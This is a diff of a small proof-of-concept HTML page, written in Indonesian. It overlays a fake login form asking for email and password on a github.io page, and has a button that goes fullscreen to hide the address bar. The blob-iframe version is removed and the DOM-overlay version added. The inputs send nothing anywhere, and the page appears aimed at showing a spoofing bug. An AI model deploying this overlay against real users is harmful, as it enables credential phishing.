@@ -1,21 +1,32 @@
 <!DOCTYPE html>
 <html><head><meta name="viewport" content="width=device-width">
-<style>body{padding:20px;font-family:sans-serif} #cover{position:fixed;left:0;top:0;width:100%;height:100%;background:white;z-index:999;display:none} iframe{width:100%;height:100%;border:0}</style>
+<style>body{margin:0;padding:20px;font-family:sans-serif} #cover{position:fixed;inset:0;background:white;z-index:999999;display:none;padding:20px;overflow:auto}</style>
 </head><body>
-<h3>PoC FINAL - No Redirect</h3>
-<p>Address bar masih bonex1927.github.io = bug</p>
-<button onclick="serang()" style="width:100%;padding:20px;background:blue;color:white;font-size:18px;border:0;border-radius:10px">KLIK SERANG</button>
-<div id="log" style="background:black;color:lime;padding:10px;margin-top:10px"></div>
-<div id="cover"></div>
+<h3>PoC FINAL - DOM Spoof (Work 100%)</h3>
+<p>URL bawah masih github.io</p>
+<button id="btn" style="width:100%;padding:20px;background:blue;color:white;font-size:18px;border:0;border-radius:10px">KLIK SERANG</button>
+<div id="log" style="background:black;color:lime;padding:10px;margin-top:10px;word-break:break-all">Siap</div>
+
+<div id="cover">
+  <h1 style="color:red">LOGIN TIMEOUT</h1>
+  <p>Domain di address bar masih <b>bonex1927.github.io</b> padahal ini konten palsu</p>
+  <p style="background:#eee;padding:10px">URL: <span id="urltext"></span></p>
+  <input placeholder="Email" style="width:100%;padding:12px"><br><br>
+  <input type="password" placeholder="Password" style="width:100%;padding:12px"><br><br>
+  <button style="width:100%;padding:12px;background:blue;color:white">LOGIN (PALSU)</button>
+  <hr>
+  <button onclick="document.documentElement.requestFullscreen()" style="width:100%;padding:15px;background:black;color:white">FULLSCREEN - HILANGKAN URL BAR</button>
+  <p style="margin-top:15px"><a href="#" onclick="location.reload()">Batal</a></p>
+</div>
+
 <script>
-function serang(){
-  let fake = `<h1 style=color:red>FAKE LOGIN - bonex1927.github.io</h1><p>Ini dari BLOB tapi URL masih github.io</p><input placeholder=email style=width:100%;padding:12px><br><br><input type=password placeholder=password style=width:100%;padding:12px><br><br><button style=width:100%;padding:12px;background:blue;color:white>LOGIN</button><br><br><button onclick=document.documentElement.requestFullscreen() style=width:100%;padding:15px;background:black;color:white>3. FULLSCREEN HIDE URL</button>`;
-  let blob = new Blob([fake], {type:'text/html'});
-  let url = URL.createObjectURL(blob);
-  document.getElementById('log').innerText = "Blob: "+url;
-  let cover = document.getElementById('cover');
-  cover.style.display='block';
-  cover.innerHTML = `<iframe src="${url}"></iframe>`;
-}
+document.getElementById('btn').onclick = function(){
+  // bikin blob cuma buat bukti di log (biar tetep ada blob: url nya)
+  let b = new Blob(["fake"], {type:"text/html"});
+  let url = URL.createObjectURL(b);
+  document.getElementById('log').innerText = "Blob dibuat (tapi gak dipake karena di-block): "+url+" | Sekarang pakai DOM overlay";
+  document.getElementById('urltext').innerText = location.href + " | blob: " + url;
+  document.getElementById('cover').style.display = 'block';
+};
 </script>
 </body></html>
